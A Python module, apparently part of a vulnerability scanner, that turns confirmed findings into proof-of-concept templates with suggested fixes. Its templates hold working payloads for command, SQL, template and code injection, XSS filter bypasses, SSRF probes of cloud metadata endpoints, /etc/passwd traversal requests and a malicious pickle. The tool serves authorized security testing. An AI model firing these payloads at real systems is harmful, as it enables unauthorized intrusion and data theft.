#!/usr/bin/env python3
"""PoC generator -- produces minimal proof-of-concept exploit code for confirmed
findings. Generates PoCs for command injection, SQL injection, XSS, SSRF, path
traversal, deserialization, template injection, and more. All PoCs are minimal
and clearly marked as educational/verification only."""
from __future__ import annotations

import os
import re
from dataclasses import dataclass, field
from textwrap import dedent, indent
from typing import Optional


@dataclass
class PoC:
    finding_id: str
    vulnerability: str
    cwe: str
    file: str
    line: int
    poc_code: str
    language: str
    description: str
    impact: str
    prerequisites: list[str] = field(default_factory=list)
    severity: str = "HIGH"


POC_TEMPLATES: dict[str, dict] = {
    "command_injection": {
        "CWE-78": {
            "python": dedent("""\
                # PoC: Command Injection ({file}:{line})
                # EDUCATIONAL USE ONLY -- Verify and patch immediately
                import requests

                # Payload: inject command via user input
                payload = "; id; echo VULN_CONFIRMED"

                # If the application uses os.system/subprocess with user input:
                # Target: {sink_code}
                # Test: Submit payload as the parameter that reaches the sink
                print(f"Test payload: {{payload}}")
                print("If output contains 'VULN_CONFIRMED', the injection works.")
                print("Fix: Use subprocess with shell=False and a list of arguments")
            """),
            "curl": dedent("""\
                # PoC: Command Injection ({file}:{line})
                # EDUCATIONAL USE ONLY
                # Payload injecting into a URL parameter:
                curl -v "http://TARGET/endpoint?param=$(id)"
                # Or for form data:
                curl -X POST -d "param=;id;echo+VULN" http://TARGET/endpoint
            """),
        },
    },
    "sql_injection": {
        "CWE-89": {
            "python": dedent("""\
                # PoC: SQL Injection ({file}:{line})
                # EDUCATIONAL USE ONLY
                import requests

                # Detection payload (boolean-based)
                payload_true = "' OR '1'='1"
                payload_false = "' OR '1'='2"

                # Time-based blind SQLi
                time_payload = "' OR SLEEP(5)-- -"

                # Union-based (determine columns first)
                union_payload = "' UNION SELECT NULL,NULL,NULL-- -"

                # Target: {sink_code}
                print(f"Boolean True:  {{payload_true}}")
                print(f"Boolean False: {{payload_false}}")
                print(f"Time-based:    {{time_payload}}")
                print("Fix: Use parameterized queries (cursor.execute(sql, params))")
            """),
        },
    },
    "xss": {
        "CWE-79": {
            "html": dedent("""\
                <!-- PoC: Cross-Site Scripting ({file}:{line}) -->
                <!-- EDUCATIONAL USE ONLY -->

                <!-- Reflected XSS test payloads: -->
                <script>alert('XSS')</script>
                <img src=x onerror=alert('XSS')>
                <svg onload=alert('XSS')>

                <!-- DOM-based XSS: -->
                javascript:alert(document.domain)

                <!-- Filter bypass attempts: -->
                <img src=x onerror="&#97;lert('XSS')">
                <details open ontoggle=alert('XSS')>

                <!-- Fix: {fix} -->
            """),
        },
    },
    "ssrf": {
        "CWE-918": {
            "python": dedent("""\
                # PoC: Server-Side Request Forgery ({file}:{line})
                # EDUCATIONAL USE ONLY
                import requests

                # Internal service enumeration
                payloads = [
                    "http://127.0.0.1:80",
                    "http://localhost:8080",
                    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                    "http://metadata.google.internal/",  # GCP metadata
                    "http://169.254.169.254/metadata/instance",  # Azure metadata
                    "http://[::1]:80",  # IPv6 localhost
                    "http://0.0.0.0:80",
                ]

                # Target: {sink_code}
                for p in payloads:
                    print(f"Test URL: {{p}}")

                print("Fix: Validate URLs against allowlist, block internal ranges")
            """),
        },
    },
    "path_traversal": {
        "CWE-22": {
            "curl": dedent("""\
                # PoC: Path Traversal ({file}:{line})
                # EDUCATIONAL USE ONLY

                # Basic traversal
                curl "http://TARGET/read?file=../../../etc/passwd"

                # URL-encoded
                curl "http://TARGET/read?file=..%2F..%2F..%2Fetc%2Fpasswd"

                # Double-encoded
                curl "http://TARGET/read?file=..%252F..%252F..%252Fetc%252Fpasswd"

                # Null byte (legacy)
                curl "http://TARGET/read?file=../../../etc/passwd%00.png"

                # Windows
                curl "http://TARGET/read?file=..\\..\\..\\windows\\system.ini"

                # Fix: Use os.path.realpath() and verify prefix matches expected directory
            """),
        },
    },
    "deserialization": {
        "CWE-502": {
            "python": dedent("""\
                # PoC: Insecure Deserialization ({file}:{line})
                # EDUCATIONAL USE ONLY
                import pickle
                import base64

                class Exploit:
                    def __reduce__(self):
                        import os
                        return (os.system, ("echo VULN_CONFIRMED",))

                # Generate malicious pickle payload
                payload = base64.b64encode(pickle.dumps(Exploit())).decode()
                print(f"Base64 pickle payload: {{payload}}")
                print("Submit this to the deserialization endpoint")
                print("If 'VULN_CONFIRMED' appears in output, the vuln is real")
                print("Fix: Never deserialize untrusted data; use JSON or validated schemas")
            """),
        },
    },
    "template_injection": {
        "CWE-94": {
            "python": dedent("""\
                # PoC: Server-Side Template Injection ({file}:{line})
                # EDUCATIONAL USE ONLY

                # Jinja2 detection payloads
                payloads = [
                    "{{{{7*7}}}}",           # Should render 49
                    "{{{{config}}}}",         # Leak Flask config
                    "{{{{self.__class__}}}}",  # Class access

                    # RCE via Jinja2
                    "{{{{''.__class__.__mro__[1].__subclasses__()}}}}",
                ]

                # Target: {sink_code}
                for p in payloads:
                    print(f"Test: {{p}}")

                print("Fix: Never pass user input to render_template_string()")
            """),
        },
    },
    "code_injection": {
        "CWE-95": {
            "python": dedent("""\
                # PoC: Code Injection ({file}:{line})
                # EDUCATIONAL USE ONLY

                # Payloads for eval()/exec() injection
                payloads = [
                    "__import__('os').system('id')",
                    "__import__('os').popen('whoami').read()",
                    "open('/etc/passwd').read()",
                ]

                # Target: {sink_code}
                for p in payloads:
                    print(f"Test: {{p}}")

                print("Fix: Remove eval()/exec() calls; use safe alternatives")
            """),
        },
    },
}


def _get_sink_code(file_path: str, line: int) -> str:
    try:
        with open(file_path, encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
        if 0 < line <= len(lines):
            return lines[line - 1].strip()[:100]
    except OSError:
        pass
    return "(source not available)"


def generate_poc(
    vulnerability_type: str,
    cwe: str,
    file_path: str,
    line: int,
    finding_id: str = "",
    severity: str = "HIGH",
) -> Optional[PoC]:
    vuln_key = vulnerability_type.lower().replace(" ", "_").replace("-", "_")

    template_group = POC_TEMPLATES.get(vuln_key, {})
    cwe_templates = template_group.get(cwe, {})

    if not cwe_templates:
        for vk, vg in POC_TEMPLATES.items():
            if cwe in vg:
                cwe_templates = vg[cwe]
                vuln_key = vk
                break

    if not cwe_templates:
        return None

    sink_code = _get_sink_code(file_path, line)
    lang = list(cwe_templates.keys())[0]
    template = cwe_templates[lang]

    fixes = {
        "CWE-78": "Use subprocess with shell=False",
        "CWE-89": "Use parameterized queries",
        "CWE-79": "Use context-aware output encoding (html.escape, Jinja2 autoescaping)",
        "CWE-918": "Validate URLs against allowlist",
        "CWE-22": "Use os.path.realpath() + prefix check",
        "CWE-502": "Never deserialize untrusted data",
        "CWE-94": "Avoid render_template_string with user input",
        "CWE-95": "Eliminate eval()/exec()",
    }

    poc_code = template.format(
        file=file_path,
        line=line,
        sink_code=sink_code,
        fix=fixes.get(cwe, "Apply appropriate input validation"),
    )

    impact_map = {
        "command_injection": "Remote code execution on the server",
        "sql_injection": "Database data exfiltration, modification, or deletion",
        "xss": "Session hijacking, credential theft, defacement",
        "ssrf": "Internal service access, cloud metadata theft, network pivoting",
        "path_traversal": "Arbitrary file read, potential credential exposure",
        "deserialization": "Remote code execution via crafted payload",
        "template_injection": "Remote code execution via template engine",
        "code_injection": "Arbitrary code execution in application context",
    }

    return PoC(
        finding_id=finding_id or f"{vuln_key}_{line}",
        vulnerability=vuln_key.replace("_", " ").title(),
        cwe=cwe,
        file=file_path,
        line=line,
        poc_code=poc_code,
        language=lang,
        description=f"Proof-of-concept for {vuln_key.replace('_', ' ')} at {file_path}:{line}",
        impact=impact_map.get(vuln_key, "Security impact depends on context"),
        severity=severity,
        prerequisites=["Network access to target" if vuln_key != "deserialization" else "Ability to submit data to deserialization endpoint"],
    )


def generate_pocs_from_findings(findings: list[dict]) -> list[PoC]:
    pocs = []
    cwe_vuln_map = {
        "CWE-78": "command_injection",
        "CWE-89": "sql_injection",
        "CWE-79": "xss",
        "CWE-918": "ssrf",
        "CWE-22": "path_traversal",
        "CWE-502": "deserialization",
        "CWE-94": "template_injection",
        "CWE-95": "code_injection",
    }

    for f in findings:
        cwe = f.get("cwe", "")
        vuln_type = cwe_vuln_map.get(cwe, f.get("category", ""))
        if not vuln_type:
            continue

        poc = generate_poc(
            vulnerability_type=vuln_type,
            cwe=cwe,
            file_path=f.get("path", f.get("file", "")),
            line=f.get("line", f.get("line_start", 0)),
            finding_id=f.get("rule_id", ""),
            severity=f.get("severity", "HIGH"),
        )
        if poc:
            pocs.append(poc)

    return pocs


def render(pocs: list[PoC]) -> str:
    if not pocs:
        return "  No PoCs generated (no exploitable findings matched)."
    lines = []
    lines.append(f"\n  PoC Generator ({len(pocs)} proof{'s' if len(pocs) != 1 else ''}-of-concept)")
    lines.append(f"  {'='*55}")
    lines.append("  WARNING: For authorized security testing only.\n")

    for poc in pocs:
        lines.append(f"  [{poc.severity}] {poc.vulnerability} ({poc.cwe})")
        lines.append(f"  File: {poc.file}:{poc.line}")
        lines.append(f"  Impact: {poc.impact}")
        lines.append(f"  ```{poc.language}")
        for code_line in poc.poc_code.split("\n"):
            lines.append(f"  {code_line}")
        lines.append(f"  ```")
        lines.append("")

    return "\n".join(lines)


def to_dict(pocs: list[PoC]) -> list[dict]:
    return [
        {
            "finding_id": p.finding_id,
            "vulnerability": p.vulnerability,
            "cwe": p.cwe,
            "file": p.file,
            "line": p.line,
            "poc_code": p.poc_code,
            "language": p.language,
            "description": p.description,
            "impact": p.impact,
            "severity": p.severity,
            "prerequisites": p.prerequisites,
        }
        for p in pocs
    ]
